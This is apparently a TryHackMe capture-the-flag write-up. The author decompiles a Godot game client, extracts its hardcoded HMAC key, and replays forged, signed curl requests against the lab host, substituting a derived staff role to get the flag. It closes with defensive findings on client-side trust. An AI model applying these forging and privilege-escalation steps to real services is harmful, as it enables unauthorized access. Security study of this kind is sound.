# TryHackMe: Grand Larceny Auto II Writeup

**Room Link:** [Grand Larceny Auto II](https://tryhackme.com/room/grandlarcenyautoii)

**Category:** Reverse engineering / API logic abuse

**Tools:** GDRE Tools (Godot RE Tools), C# decompilation, `curl`, .NET (to reimplement the signing routine)

---

## Overview

The room ships a Godot game. The game talks to a backend at `http://gla2.thm` that gates the flag behind a "heist" the player is supposed to complete in-engine. The whole challenge is client-side trust: the game client holds the HMAC signing key and derives a privileged role locally, so once you decompile it you can replay the entire heist over HTTP and skip the game.

There are two flags — the "player" one the intended path gives you, and the real "staff" one hidden behind a role value the client can derive but never uses.

---

## 1. Unpacking the game

Downloaded the room's files and ran the Godot pack through **GDRE Tools** to recover the C# sources:

```
CheatConsole.cs
CryptoUtil.cs
GameController.cs
Models.cs
PlayerState.cs
PoPClient.cs
SafehouseVault.cs
WantedSystem.cs
```

`PoPClient.cs` ("Proof of Play" client) is where everything lives.

---

## 2. Reading `PoPClient.cs`

Three things jumped out immediately.

**The signing key is hardcoded in the client:**

```csharp
private static readonly byte[] SignKey =
    Encoding.UTF8.GetBytes("gla2_crew_sign_v1_2f9b6c8ad14e");

private static string Sign(string msg)
{
    byte[] array = HMACSHA256.HashData(SignKey, Encoding.UTF8.GetBytes(msg));
    // ... hex encode
}
```

If the client can sign requests, so can I.

**The API surface is three endpoints:**

| Endpoint | Body |
|---|---|
| `POST /session` | `{}` → returns `session_id`, `token`, `stash_order` |
| `POST /checkpoint` | `session_id`, `step`, `token`, `sig` |
| `POST /claim` | `session_id`, `role`, `token`, `sig` |

The signed message formats:

```csharp
// checkpoint
Sign(sessionId + "|" + step + "|" + token);
// claim
Sign(sessionId + "|claim|" + token);
```

**And the part that matters most — a role derivation function that is defined but never called anywhere in the game:**

```csharp
public string DeriveStaffRole()
{
    string s = "heat5_stash" + StashOrder[0]
             + "_stash" + StashOrder[1]
             + "_stash" + StashOrder[2] + "_vault";
    byte[] array = SHA1.HashData(Encoding.UTF8.GetBytes(s));
    // ... hex encode
}
```

Dead code in a decompile is a giant arrow pointing at the real solution. Note it depends on `StashOrder`, which is **per-session** — so the staff role is different every run and can't be copy-pasted from a walkthrough.

---

## 3. Opening a session

```bash
curl -X POST "http://gla2.thm/session" -H "Content-Type:application/json" -d "{}"
```

```json
{"session_id":"rueUOlaKkeioiTT464V85qyo","stash_order":[0,2,1],"token":"pMQZy5jqnuEQRUkcd6juK67h"}
```

So this session's order is `0, 2, 1` and the checkpoint chain will be:

```
heat5 → stash0 → stash2 → stash1 → vault → claim
```

---

## 4. Reimplementing the signer

Rather than reverse the HMAC by hand, I dropped the decompiled routine straight into a throwaway .NET console app and fed it each message:

```csharp
using System.Text;
using System.Security.Cryptography;

public class Program
{
    private static readonly byte[] SignKey =
        Encoding.UTF8.GetBytes("gla2_crew_sign_v1_2f9b6c8ad14e");

    public static void Main()
    {
        string msg = "rueUOlaKkeioiTT464V85qyo|heat5|pMQZy5jqnuEQRUkcd6juK67h";
        byte[] array = HMACSHA256.HashData(SignKey, Encoding.UTF8.GetBytes(msg));
        StringBuilder sb = new StringBuilder(array.Length * 2);
        foreach (byte b in array) sb.Append(b.ToString("x2"));
        Console.WriteLine(sb.ToString());
    }
}
```

The important detail: **the server rotates the token on every successful checkpoint.** Each response hands back a fresh `token`, and that new token has to be used both in the next request body *and* inside the next signed message. So it's a re-sign per step, not one signature reused.

---

## 5. Walking the checkpoint chain

Wrong step name — the server tells you exactly what it wants:

```bash
curl -X POST "http://gla2.thm/checkpoint" -H "Content-Type:application/json" \
  -d '{"session_id":"rueUOlaKkeioiTT464V85qyo","step":"0","token":"pMQZy5jqnuEQRUkcd6juK67h","sig":"a86faae3..."}'
```

```json
{"error":"wrong_order","expected":"heat5"}
```

Correct step, correct signature:

```bash
curl -X POST "http://gla2.thm/checkpoint" -H "Content-Type:application/json" \
  -d '{"session_id":"rueUOlaKkeioiTT464V85qyo","step":"heat5","token":"pMQZy5jqnuEQRUkcd6juK67h","sig":"238696a0291a7dd1aef9f8d8c521fea9b2fc69f6338c5f21a486c2c2a00034b0"}'
```

```json
{"ok":true,"step":"heat5","next":"stash0","token":"mtWOIRiQslRWH6zKiPDqlzdx"}
```

Reusing the old token after rotation gives a distinct error, which confirms the rotation behaviour:

```json
{"error":"bad_token"}
```

Continuing through the chain, re-signing with each freshly issued token:

```json
{"ok":true,"step":"stash0","next":"stash2","token":"eFHruuOGL6RdEtwL1lju19hx"}
{"ok":true,"step":"stash2","next":"stash1","token":"Y8cXPjbFZI3wF29fBZf_RfQb"}
{"ok":true,"step":"stash1","next":"vault","token":"yZA4z0nRxsCI6D97PqWRBddW"}
{"ok":true,"step":"vault","next":null,"token":"qaKsoSA3Iott1W2pIW0QkYha"}
```

One useful mistake along the way: I signed for `vault` but sent `"step":"stash1"` in the body and got

```json
{"error":"bad_sig"}
```

Three distinct error codes — `wrong_order`, `bad_token`, `bad_sig` — make the server a very cooperative oracle. `wrong_order` means the signature and token were fine and only the sequence was off; `bad_sig` means the body no longer matches what was signed. That's enough feedback to debug the chain without guessing.

---

## 6. Claiming — the player flag

With the chain complete, sign `session_id|claim|token` and claim as `player`:

```bash
curl -X POST "http://gla2.thm/claim" -H "Content-Type:application/json" \
  -d '{"session_id":"rueUOlaKkeioiTT464V85qyo","role":"player","token":"qaKsoSA3Iott1W2pIW0QkYha","sig":"aeb126c8..."}'
```

```json
{"flag":"THM{n1c3_dr1v1ng_but_th4ts_th3_wr0ng_v4ult}","tier":"player","note":"civilian access — the real vault is staff-only"}
```

This matches the `RealFlag` property back in the client:

```csharp
public bool RealFlag => HasFlag && Note == "";
```

A flag with a `note` attached is the decoy. Guessing `"role":"staff"` returns the same civilian flag — the role isn't a keyword, it's a value you have to compute.

---

## 7. Deriving the staff role — the real flag

Back to the dead function. `StashOrder` for this session was `[0, 2, 1]`, so the derivation string is:

```
heat5_stash0_stash2_stash1_vault
```

SHA-1 of that:

```csharp
string s = "heat5_stash0_stash2_stash1_vault";
byte[] a2 = SHA1.HashData(Encoding.UTF8.GetBytes(s));
StringBuilder s2 = new StringBuilder(a2.Length * 2);
foreach (byte b in a2) s2.Append(b.ToString("x2"));
Console.WriteLine(s2.ToString());
// 21f0d2ffed625f9539d46368e76b88c74bdf2b1f
```

Note the signature does **not** cover `role` — `Sign(sessionId + "|claim|" + token)` only. So the same claim signature works with any role value I want to substitute:

```bash
curl -X POST "http://gla2.thm/claim" -H "Content-Type:application/json" \
  -d '{"session_id":"rueUOlaKkeioiTT464V85qyo","role":"21f0d2ffed625f9539d46368e76b88c74bdf2b1f","token":"qaKsoSA3Iott1W2pIW0QkYha","sig":"aeb126c8..."}'
```

```json
{"flag":"THM{[REDACTED]}"}
```

No `note` field — `RealFlag` is true. That's the vault.

---

## Findings

**1. Hardcoded HMAC key in a client binary.** `gla2_crew_sign_v1_2f9b6c8ad14e` ships inside the game. Any signature the client can produce, an attacker can produce. A shared secret distributed to every user is not a secret; the signature proves nothing about who sent the request.

**2. Incomplete signature coverage.** The claim signature covers `session_id|claim|token` but not `role` — the single most security-relevant field in the request. Signatures must cover every parameter that influences an authorization decision, or the attacker just edits the unsigned part.

**3. Client-side privilege derivation.** `DeriveStaffRole()` computes a privileged identifier from data the client already holds. Anything the client can derive, an attacker can derive. Authorization tiers belong on the server, keyed to server-side session state.

**4. Verbose error oracle.** `wrong_order` / `bad_token` / `bad_sig` distinguish exactly which check failed and `wrong_order` even returns the expected next value. Convenient for debugging, and equally convenient for an attacker reconstructing the protocol.

**5. Dead code left in the shipped build.** `DeriveStaffRole()` is never invoked by the game. It survived into the release binary and is the entire solution. Unreferenced code still ships, and still documents your internals.

---

## Takeaways

The pattern here is "proof of play" — the server trusts the client to attest that gameplay happened. That model can't work when the attestation logic lives in the artifact you hand the attacker. The fix isn't a better key or a longer hash; it's moving the state machine server-side so the checkpoint sequence reflects something the server actually observed.

Practically, the workflow was: decompile → find the crypto → find the dead code → reimplement the signer → replay the protocol with `curl`. No game was played at any point.
